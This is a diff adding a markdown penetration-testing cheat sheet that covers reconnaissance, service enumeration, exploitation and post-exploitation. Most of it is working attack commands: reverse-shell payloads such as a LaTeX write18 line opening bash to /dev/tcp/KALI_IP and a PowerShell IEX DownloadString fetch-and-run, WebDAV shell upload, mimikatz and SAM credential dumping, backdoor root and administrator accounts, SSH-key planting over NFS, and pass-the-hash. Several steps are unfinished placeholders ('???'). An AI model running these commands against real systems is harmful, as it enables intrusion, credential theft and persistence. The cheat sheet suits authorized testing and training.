@@ -1,0 +1,614 @@
+## Reminders
+
+**Remember to log all the things!**
+
+* Metasploit - spool /home/<username>/.msf3/logs/console.log
+* Save contents from each terminal!
+* Linux - script myoutput.txt  # Type exit to stop
+
+## Setup
+
+```bash
+# Disable network-manager
+$ service network-manager stop
+
+# Set IP address
+$ ifconfig eth0 192.168.50.12/24
+
+# Set default gateway
+route add default gw 192.168.50.9
+
+# Set DNS servers
+$ echo "nameserver 192.168.100.2" >> /etc/resolv.conf
+
+# Show routing table
+C:\> route print   # Windows
+$ route -n         # Linux
+
+# Add static route
+C:\> route add 0.0.0.0 mask 0.0.0.0 192.168.50.9   # Windows
+$ route add -net 192.168.100.0/24 gw 192.16.50.9   # Linux
+
+# Subnetting easy mode
+$ ipcalc 192.168.0.1 255.255.255.0
+
+# Windows SAM file locations
+C:\> dir c:\windows\system32\config\
+C:\> dir c:\windows\repair\
+C:\> bkhive system /root/hive.txt
+C:\> samdump2 SAM /root/hive.txt > /root/hash.txt
+
+# Python Shell
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+## Internet Host/Network Enumeration
+
+```bash
+# WHOIS Querying
+$ whois www.domain.com
+
+# Resolve an IP using DIG
+$ dig @8.8.8.8 securitymuppets.com
+
+# Find Mail servers for a domain
+$ dig @8.8.8.8 securitymuppets.com -t mx
+
+# Find any DNS records for a domain
+$ dig @8.8.8.8 securitymuppets.com -t any
+
+# Zone Transfer
+$ dig @192.168.100.2 securitymuppets.com -t axfr
+$ host -l securitymuppets.com 192.168.100.2
+$ nslookup / ls -d domain.com.local
+
+# Fierce
+$ fierce -dns <domain> -file <output_file>
+$ fierce -dns <domain> -dnsserver <server>
+$ fierce -range <ip-range> -dnsserver <server>
+$ fierce -dns <domain> -wordlist <wordlist>
+```
+
+## IP Network scanning
+
+```bash
+# ARP Scan
+$ arp-scan 192.168.50.8/28 -I eth0
+```
+
+### NMAP Scans
+
+```bash
+# Nmap ping scan
+$ sudo nmap –sn -oA nmap_pingscan 192.168.100.0/24 (-PE)
+
+# Nmap SYN/Top 100 ports Scan
+$ nmap -sS -F -oA nmap_fastscan 192.168.0.1/24
+
+# Nmap SYN/Version All port Scan - ## Main Scan
+$ sudo nmap -sV -PN -p0- -T4 -A --stats-every 60s --reason -oA nmap_scan 192.168.0.1/24
+
+# Nmap SYN/Version No Ping All port Scan
+$ sudo nmap -sV -Pn -p0- --exclude 192.168.0.1 --reason -oA nmap_scan 192.168.0.1/24
+
+# Nmap UDP All port scan - ## Main Scan
+$ sudo nmap -sU -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_scan 192.168.0.1/24
+
+# Nmap UDP/Fast Scan
+$ nmap -F -sU -oA nmap_UDPscan 192.168.0.1/24
+
+# Nmap Top 1000 port UDP Scan
+$ nmap -sU -oA nmap_UDPscan 192.168.0.1/24
+
+# Nmap enumerate SSL ciphers on remote host/port
+$ nmap -Pn -p 5986 --script=ssl-enum-ciphers <TARGET>
+
+# HPING3 Scans
+$ hping3 -c 3 -s 53 -p 80 -S 192.168.0.1
+# Open = flags = SA
+# Closed = Flags = RA
+# Blocked = ICMP unreachable
+# Dropped = No response
+
+# Source port scanning
+$ nmap -g <port> (88 (Kerberos) port 53 (DNS) or 67 (DHCP))
+# Source port also doesn't work for OS detection.
+
+# Speed settings:
+# -n                Disable DNS resolution 
+# -sS               TCP SYN (Stealth) Scan 
+# -Pn               Disable host discovery
+# -T5               Insane time template
+# --min-rate 1000   1000 packets per second
+# --max-retries 0   Disable retransmission of timed-out probes
+```
+
+## Cisco/Networking Commands
+
+```bash
+? - Help
+> - User mode
+# - Privileged mode
+router(config)# - Global Configuration mode
+```
+enable secret more secure than enable password.
+
+For example, in the configuration command:
+enable secret 5 $1$iUjJ$cDZ03KKGh7mHfX2RSbDqP.
+The enable secret has been hashed with MD5, whereas in the command:
+username jdoe password 7 07362E590E1B1C041B1E124C0A2F2E206832752E1A01134D
+The password has been encrypted using the weak reversible algorithm.
+
+```bash
+#  Change to privileged mode to view configs
+cisco> enable
+
+# Change to global config mode to modify
+cisco# config terminal/config t
+
+# Gives you the router's configuration register (Firmware)
+cisco# show version
+
+# Shows the router, switch, or firewall's current configuration
+cisco# show running-config
+
+# show the router's routing table
+cisco# show ip route
+
+# Dump config but obscure passwords
+cisco# show tech-support
+```
+
+## Remote Information Services
+
+### DNS
+
+```bash
+# Zone Transfer
+$ host -l securitymuppets.com 192.168.100.2
+
+# Metasploit Auxiliarys:
+metasploit> use auxiliary/gather/dns...
+```
+
+### Finger - Enumerate Users
+
+```bash
+$ finger @192.168.0.1
+$ finger -l -p user@ip-address
+metasploit> use auxiliary/scanner/finger/finger_users
+```
+
+### NTP
+
+```bash
+# Use Metasploit Auxiliarys
+metasploit> use ...
+```
+
+### SNMP
+```bash
+# Use onsixtyone tool and a dictionary
+$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
+
+# Use metasploit SNP module
+metasploit> ?? # Use Metasploit Module snmp_enum
+
+# Use snmpcheck
+$ snmpcheck -t snmpservice
+```
+
+### rservices
+
+```bash
+$ rwho 192.168.0.1
+$ rlogin -l root 192.168.0.17
+```
+
+### RPC Services
+```bash
+$ rpcinfo -p
+
+metasploit> ?? # Use Endpoint_mapper module
+```
+
+## Web Services
+
+### WebDAV
+
+Metasploit Auxiliarys
+
+1) Upload shell to Vulnerable WebDAV directory:
+
+   ```
+   $ msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=4444 R | msfencode -t asp -o shell.asp
+   ```
+
+1) Run cadaver?
+
+   ```
+   $ cadaver http://192.168.0.60/
+   ```
+
+1) ???
+
+   ```
+   $ put shell.asp shell.txt
+   ```
+
+1) ???
+
+   ```bash
+   $ copy shell.txt shell.asp;.txt
+   ```
+
+1) Start reverse handler
+
+   ```bash
+   ???
+   ```
+
+1) Browse to `http://192.168.0.60/shell.asp;.txt`
+
+## Windows Networking Services
+
+Get Domain Information:
+```
+C:\> nltest /DCLIST:DomainName
+C:\> nltest /DCNAME:DomainName
+C:\> nltest /DSGETDC:DomainName
+```
+
+Netbios Enumeration
+```bash
+C:\> nbtscan -r 192.168.0.1-100
+C:\> nbtscan -f hostfiles.txt
+```
+
+enum4linux
+```bash
+$ enum4linux ???
+```
+
+RID Cycling
+```bash
+meterpreter> use auxiliary/scanner/smb/smb_lookupsid
+```
+
+# Null Session in Windows
+```bash
+C:\ net use \\192.168.0.1\IPC$ "" /u:""
+```
+
+# Null Session in Linux
+```bash
+$ smbclient -L //192.168.99.131
+```
+
+## Accessing Email Services
+
+### Metasploit Auxiliarys
+
+SMTP Open Relay Commands
+```bash
+$ ncat -C 86.54.23.178 25
+> HELO mail.co.uk
+> MAIL FROM: <Attacker@mail.co.uk>
+> RCPT TO: <Victim@email.com>
+> DATA
+```
+
+## VPN Testing
+
+ike-scan
+```bash
+$ ike-scan 192.168.207.134
+$ sudo ike-scan -A 192.168.207.134
+$ sudo ike-scan -A 192.168.207.134 --id=myid -P192-168-207-134key
+```
+
+pskcrack
+```bash
+$ psk-crack -b 5 192-168-207-134key
+$ psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
+$ psk-crack -d /path/to/dictionary 192-168-207-134key
+```
+
+## Unix RPC
+
+### NFS Mounts
+
+```bash
+meterpreter> use auxiliary/scanner/nfs/nfsmount
+```
+
+```bash
+$ rpcinfo -p 192.168.0.10
+```
+
+```bash
+$ showmount -e 192.168.0.10
+$ mount 192.168.0.10:/secret /mnt/share/
+```
+
+```bash
+$ ssh-keygen
+$ mkdir /tmp/r00t
+$ mount -t nfs 192.168.0.10:/secret /mnt/share/
+$ cat ~/.ssh/id_rsa.pub >> /mnt/share/root/.ssh/authorized_keys
+$ umount /mnt/share
+$ ssh root@192.168.0.10
+```
+
+## Misc
+
+### LaTeX
+
+1) Setup a netcat listener on Kali
+   ```
+   kali$ nc -nlvp 31337
+   ```
+2) Use Burp or Postman to capture and repeat POST
+3) Modify payload to post following content
+   ```
+   \immediate\write18{bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/31337+0>%261'}
+   ```
+   Notice that the content is URL encoded! Also, the `KALI_IP` is often times a VPN IP, like on the tun0 interface. Basically it shold be the interface/IP that the remote machine has access to reach.
+
+## Post Exploitation
+
+Command prompt access on Windows Host
+```bash
+pth-winexe -U Administrator%<hash> //<host ip> cmd.exe
+```
+
+Add Linux User
+```bash
+/usr/sbin/useradd –g 0 –u 0 –o user
+echo user:password | /usr/sbin/chpasswd
+```
+
+Add Windows User
+```
+net user username password@1 /add
+net localgroup administrators username /add
+```
+
+Solaris Commands
+```bash
+useradd -o user
+passwd user
+usermod -R root user
+```
+
+Dump remote SAM:
+```bash
+PwDump.exe -u localadmin 192.168.0.1
+```
+
+Mimikatz
+```bash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonPasswords full
+```
+
+Meterpreter
+```bash
+meterpreter> run winenum
+meterpreter> use post/windows/gather/smart_hashdump
+
+meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token TVM\domainadmin
+meterpreter > add_user hacker password1 -h 192.168.0.10
+meterpreter > add_group_user "Domain Admins" hacker -h 192.168.0.10
+
+meterpreter > load mimikatz
+meterpreter > wdigest
+meterpreter > getWdigestPasswords
+Migrate if does not work!
+```
+
+Kitrap0d
+```bash
+Download vdmallowed.exe and vdmexploit.dll to victim
+Run vdmallowed.exe to execute system shell
+```
+
+# Windows Information
+```bash
+On Windows:
+ipconfig /all
+systeminfo
+net localgroup administrators
+net view
+net view /domain
+```
+
+# SSH Tunnelling
+```bash
+Remote forward port 222
+ssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118
+```
+
+## Metasploit
+
+### Metasploit Pivot
+
+Compromise 1st machine
+
+```
+meterpreter> run arp_scanner -r 10.10.10.0/24
+meterpreter> route add 10.10.10.10 255.255.255.248 <session>
+meterpreter> use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp)> use bind shell
+```
+
+or run autoroute:
+
+```bash
+meterpreter> ipconfig
+meterpreter> run autoroute -s 10.1.13.0/24
+meterpreter> getsystem
+meterpreter> run hashdump
+meterpreter> use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp)> use exploit/windows/smb/psexec 
+```
+
+or port forwarding:
+
+```
+meterpreter> run autoroute -s 10.1.13.0/24
+meterpreter> use auxiliary/scanner/portscan/tcp
+msf auxiliary(tcp)> portfwd add -l <listening port> -p <remote port> -r <remote/internal host>
+```
+
+or socks proxy:
+
+```
+meterpreter> route add 10.10.10.10 255.255.255.248 <session>
+meterpreter> use auxiliary/server/socks4a
+# Add proxy to /etc/proxychains.conf
+msf auxiliary(tcp)> proxychains nmap -sT -T4 -Pn 10.10.10.50
+msf auxiliary(tcp)> setg socks4:127.0.0.1:1080
+```
+
+## Pass the hash
+
+If NTML only:
+
+```bash
+00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c
+STATUS_ACCESS_DENIED (Command=117 WordCount=0):
+```
+
+This can be remedied by navigating to the registry key, `"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters"` on the target systems and setting the value of `"RequireSecuritySignature"` to `"0"`
+
+```
+# Run hashdump on the first compromised machine:
+meterpreter> run post/windows/gather/hashdump
+
+# Run Psexec module and specify the hash:
+meterpreter> use exploit/windows/smb/psexec
+```
+
+## Enable RDP:
+
+```bash
+meterpreter> run getgui -u hacker -p s3cr3t
+
+# Clean up command:
+meterpreter> run multi_console_command \
+                 -rc /root/.msf3/logs/scripts/getgui/clean_up__20110112.2448.rc
+```
+
+## AutoRunScript
+
+1) Automatically run scripts before exploiation:
+
+   ```bash
+   set AutoRunScript "migrate explorer.exe"
+   ```
+
+1) Set up SOCKS proxy in MSF
+
+1) Run a post module against all sessions
+
+   ```bash
+   $ resource /usr/share/metasploit-framework/scripts/resource/run_all_post.rc
+   ```
+
+1) Find local subnets 'Whilst in meterpreter shell'
+
+   ```bash
+   meterpreter> run get_local_subnets
+   ```
+
+1) Add the correct Local host and Local port parameters
+
+   ```bash
+   $ echo "Invoke-Shellcode -Payload windows/meterpreter/reverse_https \
+                            -Lhost 192.168.0.7 \
+                            -Lport 443 \
+                            -Force" \
+   >> /var/www/payload
+   ```
+
+1) Set up psexec module on metasploit
+
+   ```bash
+   metasploit> use auxiliary/admin/smb/psexec_command
+   metasploit> set command powershell \
+                   -Exec Bypass \
+                   -NoL \
+                   -NoProfile \
+                   -Command IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.0.9/payload\')
+   ```
+   
+1) Start reverse Handler to catch the reverse connection
+
+   Module options (exploit/multi/handler):
+   Payload options (windows/meterpreter/reverse_https):
+
+   ```bash
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
+   LHOST     192.168.0.9      yes       The local listener hostname
+   LPORT     443              yes       The local listener port
+   ```
+   
+1) Show evasion module options
+
+   ```bash
+   metasploit> show evasion
+   ```
+
+### Metasploit Shellcode
+
+```
+$ msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d'
+```
+
+## File Transfer Services
+
+Start TFTPD Server
+```bash
+$ atftpd --daemon --port 69 /tmp
+```
+
+Connect to TFTP Server
+```bash
+$ tftp 192.168.0.10
+tftp> put / get files
+```
+
+## LDAP Querying
+
+Tools:
+ldapsearch
+LDAPExplorertool2
+
+Anonymous Bind:
+ldapsearch -h ldaphostname -p 389 -x -b "dc=domain,dc=com"
+
+Authenticated:
+ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>, DC=com" -b "DC=<domain>, DC=com" -W
+
+Useful Links:
+http://www.lanmaster53.com/2013/05/public-facing-ldap-enumeration/
+http://blogs.splunk.com/2009/07/30/ldapsearch-is-your-friend/
+
+
+## Password Attacks
+
+```
+# Bruteforcing http password prompts
+medusa -h <ip/host> \
+       -u <user> \
+       -P <password list> \
+       -M http \
+       -n <port> \
+       -m DIR:/<directory> \
+       -T 30
+```
